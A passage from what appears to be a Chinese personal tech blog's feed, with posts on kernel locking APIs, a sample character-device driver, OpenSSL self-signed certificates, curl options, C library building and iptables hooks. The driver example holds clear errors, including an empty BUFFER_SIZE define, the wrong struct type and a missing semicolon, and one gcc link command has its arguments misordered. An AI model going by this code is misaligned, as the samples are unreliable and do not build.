class="hljs-keyword">struct</span> semaphore *sem)</span>;<span class="hljs-comment">//深度睡眠</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">down_interruptible</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> semaphore *sem)</span>;<span class="hljs-comment">//浅度睡眠</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">up</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> semaphore *sem)</span>;<span class="hljs-comment">//释放信号量</span><br></code></pre></td></tr></table></figure><h3 id="4-使用互斥锁"><a href="#4-使用互斥锁" class="headerlink" title="4.使用互斥锁"></a>4.使用互斥锁</h3><h5 id="4-1-互斥锁类型"><a href="#4-1-互斥锁类型" class="headerlink" title="4.1.互斥锁类型"></a>4.1.互斥锁类型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">mutex_t</span> mutex<br></code></pre></td></tr></table></figure><h5 id="4-2-常用的api"><a href="#4-2-常用的api" class="headerlink" title="4.2.常用的api"></a>4.2.常用的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">mutex_init</span><span class="hljs-params">(&amp;mymutext)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">mutex_lock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mutex *mutex)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">mutex_unlock</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mutex *mutex)</span>;<br></code></pre></td></tr></table></figure><h3 id="5-并发访问控制的选择"><a href="#5-并发访问控制的选择" class="headerlink" title="5.并发访问控制的选择"></a>5.并发访问控制的选择</h3><p>1.不允许睡眠的上下文采用忙等待,不可以睡眠的上下文使和中断上下文使用忙等待类</p><p>2.允许睡眠的上下文,或者临界区代码执行时间过长的建议使用阻塞类</p><p>3.中断屏蔽仅在有与中断上下文共享资源时使用</p><p>4.共享资源如果只是简单的整形变量时使用原子变量</p>]]></content>
    
    
    <categories>
      
      <category>软件开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux内核驱动开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux字符设备驱动开发入门</title>
    <link href="/2022/06/24/linux%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/"/>
    <url>/2022/06/24/linux%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="linux字符设备驱动开发入门"><a href="#linux字符设备驱动开发入门" class="headerlink" title="linux字符设备驱动开发入门"></a>linux字符设备驱动开发入门</h1><h3 id="1-基本步骤"><a href="#1-基本步骤" class="headerlink" title="1.基本步骤"></a>1.基本步骤</h3><pre><code class=" mermaid">graph LR;a(&quot;申请设备号&quot;)--&gt;b(&quot;注册设备号&quot;)--&gt;c(&quot;设置设备对应的file_operations&quot;)--&gt;d(&quot;加入到内核链表&quot;)ab(&quot;MKDEV(major,minor)&quot;)--&gt;ac(&quot;register_chrdev_region()&quot;)--&gt;ad(&quot;cdev_init()&quot;)--&gt;ae(&quot;cdev_add()&quot;)</code></pre><h3 id="2-实例"><a href="#2-实例" class="headerlink" title="2.实例"></a>2.实例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//驱动程序源码</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/uaccess.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFFER_SIZE;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mychar</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">dev_t</span> devnum;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> curlen;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">dev</span> <span class="hljs-title">mydev</span>;</span><br>    <span class="hljs-type">char</span> buffer[BUFFER_SIZE];<br>&#125;mychardev;<br><span class="hljs-comment">//设备打开函数</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">mychar_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *node,<span class="hljs-keyword">struct</span> file *filp)</span><br>&#123;<br>    <span class="hljs-comment">//获取结构体地址</span><br>    filp-&gt;private_data = (<span class="hljs-type">void</span>*)container_of(node-&gt;i_cdev,<span class="hljs-keyword">struct</span> mychar,mydev);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">mychar_close</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *node,<span class="hljs-keyword">struct</span> file *filp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">mychar_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp,<span class="hljs-type">char</span> __user *buffer,<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> count,<span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *pos)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">mychar_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp,<span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buffer,<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> count,<span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> *pos)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">mychar_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *filp,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd,<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> __init <span class="hljs-title function_">my_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//申请设备号</span><br>    mychardev.devnum = MKDEV(<span class="hljs-number">11</span>,<span class="hljs-number">256</span>);<br>    <span class="hljs-comment">//注册设备号</span><br>    <span class="hljs-keyword">if</span>(register_chrdev_region(mychardev.devnum,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;mychar&quot;</span>)!=<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(alloc_chrdev_region(&amp;mychardev.devnum,<span class="hljs-number">256</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&quot;mychar&quot;</span>)!=<span class="hljs-number">0</span>)<br>        &#123;<br>            printk(<span class="hljs-string">&quot;register devnum error!\n&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_operations</span> <span class="hljs-title">fops</span>=</span><br>    &#123;<br>        .owner = THIS_MODULE,<br>        .open = mychar_open,<br>        .release = mychar_close,<br>        .read = mychar_read,<br>        .write = mychar_write,<br>        .unlocked_ioctl = mychar_ioctl,<br>    &#125;<br>    <span class="hljs-comment">//设置对应的文件操作函数</span><br>    cdev_init(&amp;mychardev.mydev,&amp;fops);<br>    <span class="hljs-comment">//加入到内核链表</span><br>    cdev_add(&amp;mychardev.mydev,mychardev.devnum,<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">void</span> __exit <span class="hljs-title function_">my_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    cdev_del(&amp;mychardev.mydev);<br>    unregister_chrdev_region(mychardev.devnum,<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br>module_init(my_init);<br>module_exit(my_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;404NotFound&quot;</span>);<br>MODULE_DESCRIPTION(<span class="hljs-string">&quot;just a char devices driver!&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Makefile">//项目的Makefile<br>KERNELDIR ?= /lib/modules/<span class="hljs-variable">$(<span class="hljs-built_in">shell</span> uname -r)</span>/build<br>PWD ?= <span class="hljs-variable">$(<span class="hljs-built_in">shell</span> pwd)</span><br><span class="hljs-section">modules:</span><br><span class="hljs-variable">$(MAKE)</span> -C <span class="hljs-variable">$(KERNELDIR)</span> M=<span class="hljs-variable">$(PWD)</span> modules<br><span class="hljs-section">clean:</span><br>rm *.o *.mod *.symvers<br>obj-m += main.o<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux内核驱动开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>openssl自签证书</title>
    <link href="/2022/06/06/openssl%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6/"/>
    <url>/2022/06/06/openssl%E8%87%AA%E7%AD%BE%E8%AF%81%E4%B9%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="openssl自签证书"><a href="#openssl自签证书" class="headerlink" title="openssl自签证书"></a>openssl自签证书</h1><p>自签证书一般有三个步骤</p><ul><li><p>1.生成私钥</p></li><li><p>2.生成证书的请求信息,用于提交给ca进行签名(自己作为ca为自己签名)</p></li><li><p>3.使用私钥对证书请求信息自行签名</p></li></ul><h4 id="1-生成私钥"><a href="#1-生成私钥" class="headerlink" title="1.生成私钥"></a>1.生成私钥</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl genrsa -des3 -out server.key 2048<br><span class="hljs-comment">#生成rsa私钥，des3算法，2048位强度，server.key是秘钥文件名。</span><br></code></pre></td></tr></table></figure><h4 id="2-生成证书请求信息"><a href="#2-生成证书请求信息" class="headerlink" title="2.生成证书请求信息"></a>2.生成证书请求信息</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl req -new -key server.key -out server.csr<br></code></pre></td></tr></table></figure><h4 id="3-删除私钥的密码"><a href="#3-删除私钥的密码" class="headerlink" title="3.删除私钥的密码"></a>3.删除私钥的密码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl rsa -<span class="hljs-keyword">in</span> server.key -out server.key<br></code></pre></td></tr></table></figure><h4 id="4-生成证书"><a href="#4-生成证书" class="headerlink" title="4.生成证书"></a>4.生成证书</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl x509 -req -days 365 -<span class="hljs-keyword">in</span> server.csr -signkey server.key -out server.crt<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>curl基本使用</title>
    <link href="/2022/05/26/curl%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/05/26/curl%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="curl基本使用"><a href="#curl基本使用" class="headerlink" title="curl基本使用"></a>curl基本使用</h1><h3 id="1-什么是curl"><a href="#1-什么是curl" class="headerlink" title="1.什么是curl?"></a>1.什么是curl?</h3><p>curl是一个命令行工具,用于向指定的url发送请求,支持http,mqtt,ftp,rtmp,pop2,scp等各种协议</p><h3 id="2-基本使用"><a href="#2-基本使用" class="headerlink" title="2.基本使用"></a>2.基本使用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl --verbose www.baidu.com<br><span class="hljs-comment">#verbose 用于打开verbose,使用这个模式可以查看到发送的数据包信息</span><br>curl -A <span class="hljs-string">&quot;curl&quot;</span> www.baidu.com<br><span class="hljs-comment">#-A参数指定特定的User-Agent</span><br>curl -A <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0&quot;</span> https://www.baidu.com/index.html<br><span class="hljs-comment">#-b参数用于向服务器传输cookie,也可以指定cookie文件</span><br>curl -b <span class="hljs-string">&quot;x_key=asjdflkdjaslfdjklasjlkf&quot;</span> http://www.google.com/index.html<br><span class="hljs-comment">#-c参数用于将服务器设置的cookie写入一个文件</span><br>curl -c coookie.txt -v http://www.baidu.com/index.html<br><span class="hljs-comment">#-d,--data-urlencode参数用于发送post请求的数据</span><br>curl -d <span class="hljs-string">&quot;name=admin&amp;password=password&quot;</span> -X POST https://www.baidu.com/index.html<br><span class="hljs-comment">#-X参数用与指定发送的请求方式如Get Post</span><br><span class="hljs-comment">#-e参数用于指定refer头</span><br>curl -e <span class="hljs-string">&quot;http://www.baidu.com/index.html&quot;</span> https://www.google.com<br><span class="hljs-comment">#-F参数用于上传二进制文件</span><br>curl -F <span class="hljs-string">&#x27;file=@photo.png&#x27;</span> https://baidu.com/profile<br><span class="hljs-comment">#-F参数可以指定上传的文件的MIME类型</span><br>curl -F <span class="hljs-string">&quot;file=@photo.png;image/png&quot;</span> -X POST https://www.baidu.com/profile<br>curl -F <span class="hljs-string">&quot;file=@photo.png;filename=me.png&quot;</span> -X POST https://www.baidu.com/profile<br></code></pre></td></tr></table></figure><h3 id="3-curl配置文件"><a href="#3-curl配置文件" class="headerlink" title="3.curl配置文件"></a>3.curl配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">~/.curlrc <span class="hljs-comment">#用户配置文件</span><br>/etc/curlrc <span class="hljs-comment">#系统配置文件</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件基本使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>c语言库的制作</title>
    <link href="/2022/05/18/c%E8%AF%AD%E8%A8%80%E5%BA%93%E7%9A%84%E5%88%B6%E4%BD%9C/"/>
    <url>/2022/05/18/c%E8%AF%AD%E8%A8%80%E5%BA%93%E7%9A%84%E5%88%B6%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<h1 id="c语言库的制作"><a href="#c语言库的制作" class="headerlink" title="c语言库的制作"></a>c语言库的制作</h1><h3 id="1-静态库和动态库的制作"><a href="#1-静态库和动态库的制作" class="headerlink" title="1.静态库和动态库的制作"></a>1.静态库和动态库的制作</h3><h5 id="1-准备头文件和对应的api实现源码"><a href="#1-准备头文件和对应的api实现源码" class="headerlink" title="1.准备头文件和对应的api实现源码"></a>1.准备头文件和对应的api实现源码</h5><p>1.mylib.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">interface</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br></code></pre></td></tr></table></figure><p>1.mylib.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mylib.h&quot;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">interface</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;this is my first interface &quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="制作静态库"><a href="#制作静态库" class="headerlink" title="制作静态库"></a>制作静态库</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#编译目标文件</span><br>gcc -c mylib.c -o mylib.o<br><span class="hljs-comment">#制作静态库文件</span><br>ar crs libmylib.a mylib.o<br></code></pre></td></tr></table></figure><h6 id="制作动态库"><a href="#制作动态库" class="headerlink" title="制作动态库"></a>制作动态库</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#编译目标文件</span><br>gcc -c mylib.c -o mylib.o<br><span class="hljs-comment">#制作动态链接库、</span><br>gcc -shared -o libmylib.so mylib.o<br></code></pre></td></tr></table></figure><h3 id="2-自定义库的使用"><a href="#2-自定义库的使用" class="headerlink" title="2.自定义库的使用"></a>2.自定义库的使用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*main.c*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;mylib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    interface();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h6 id="静态库的使用"><a href="#静态库的使用" class="headerlink" title="静态库的使用"></a>静态库的使用</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#编译</span><br>gcc -L. -lmylib main.c -o main<br><span class="hljs-comment">#运行</span><br>./main<br></code></pre></td></tr></table></figure><h6 id="动态库的使用"><a href="#动态库的使用" class="headerlink" title="动态库的使用"></a>动态库的使用</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">编译目标文件<br>gcc -L. -lmylib main.c -o main<br><span class="hljs-comment">#运行</span><br><span class="hljs-comment">#是指动态链接库的路径,(可以设置LD_LIBRARY_PATH的值或者是将编译好的动态链接库拷贝至/usr/lib路径下)</span><br><span class="hljs-built_in">export</span> LD_LIBRARY_PATH=.<br>./main<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>嵌入式开发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iptables的基本原理以及使用</title>
    <link href="/2022/04/30/iptables/"/>
    <url>/2022/04/30/iptables/</url>
    
    <content type="html"><![CDATA[<h1 id="netfilter-x2F-iptables使用"><a href="#netfilter-x2F-iptables使用" class="headerlink" title="netfilter&#x2F;iptables使用"></a>netfilter&#x2F;iptables使用</h1><h3 id="1-什么是iptables？"><a href="#1-什么是iptables？" class="headerlink" title="1.什么是iptables？"></a>1.什么是iptables？</h3><p>netfliter&#x2F;iptables是linux一个用来过滤流量以及数据包转发的内核模块</p><p>是linux内核的一部分,iptables是linux中的一个工具,运行在用户空间,可以控制netfliter中增加修改删除数据包的处理规则,netfliter位于网卡和内核之间,可以控制计算机的进出流量</p><h3 id="2-内核源码分析"><a href="#2-内核源码分析" class="headerlink" title="2.内核源码分析"></a>2.内核源码分析</h3><h5 id="2-1-hooks函数"><a href="#2-1-hooks函数" class="headerlink" title="2.1.hooks函数"></a>2.1.hooks函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nf_inet_hooks</span> &#123;</span><br>NF_INET_PRE_ROUTING,<br>NF_INET_LOCAL_IN,<br>NF_INET_FORWARD,<br>NF_INET_LOCAL_OUT,<br>NF_INET_POST_ROUTING,<br>NF_INET_NUMHOOKS,<br>NF_INET_INGRESS = NF       <br><span class="hljs-comment">//hooks函数定义</span><br></code></pre></td></tr></table></figure><h5 id="2-2-第一个挂接点-NF-INET-PRE-ROUTING"><a href="#2-2-第一个挂接点-NF-INET-PRE-ROUTING" class="headerlink" title="2.2.第一个挂接点(NF_INET_PRE_ROUTING)"></a>2.2.第一个挂接点(NF_INET_PRE_ROUTING)</h5><p>这个挂接点是网卡接受数据之后第一个执行的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//网卡接受数据后调用的第一个函数就是ip_rcv函数,ipv6为ip6_rcv</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">ip_rcv</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb, <span class="hljs-keyword">struct</span> net_device *dev, <span class="hljs-keyword">struct</span> packet_type *pt,</span><br><span class="hljs-params">   <span class="hljs-keyword">struct</span> net_device *orig_dev)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> *<span class="hljs-title">net</span> =</span> dev_net(dev);<br><br>skb = ip_rcv_core(skb, net);<br><span class="hljs-keyword">if</span> (skb == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> NET_RX_DROP;<br><br><span class="hljs-keyword">return</span> NF_HOOK(NFPROTO_IPV4, NF_INET_PRE_ROUTING,<br>       net, <span class="hljs-literal">NULL</span>, skb, dev, <span class="hljs-literal">NULL</span>,<br>       ip_rcv_finish);<span class="hljs-comment">//下一个挂接点NF_INET_PRE_ROUTING</span><br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-3-第二个挂接点（NF-INET-LOCAL-IN"><a href="#2-3-第二个挂接点（NF-INET-LOCAL-IN" class="headerlink" title="2.3.第二个挂接点（NF_INET_LOCAL_IN)"></a>2.3.第二个挂接点（NF_INET_LOCAL_IN)</h5><p>这个挂接点在数据包进行路由之后,数据包目标ip是本机的时候执行的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">ip_local_deliver</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb)</span><br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *Reassemble IP fragments.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> *<span class="hljs-title">net</span> =</span> dev_net(skb-&gt;dev);<br><br><span class="hljs-keyword">if</span> (ip_is_fragment(ip_hdr(skb))) &#123;<br><span class="hljs-keyword">if</span> (ip_defrag(net, skb, IP_DEFRAG_LOCAL_DELIVER))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> NF_HOOK(NFPROTO_IPV4, NF_INET_LOCAL_IN,<br>       net, <span class="hljs-literal">NULL</span>, skb, skb-&gt;dev, <span class="hljs-literal">NULL</span>,<br>       ip_local_deliver_finish);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="2-3-第三个挂接点-NF-INET-FORWARD"><a href="#2-3-第三个挂接点-NF-INET-FORWARD" class="headerlink" title="2.3.第三个挂接点(NF_INET_FORWARD)"></a>2.3.第三个挂接点(NF_INET_FORWARD)</h5><p>数据包进入网络层进行路由时,数据包路由选择后目标ip不是本机时执行的hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 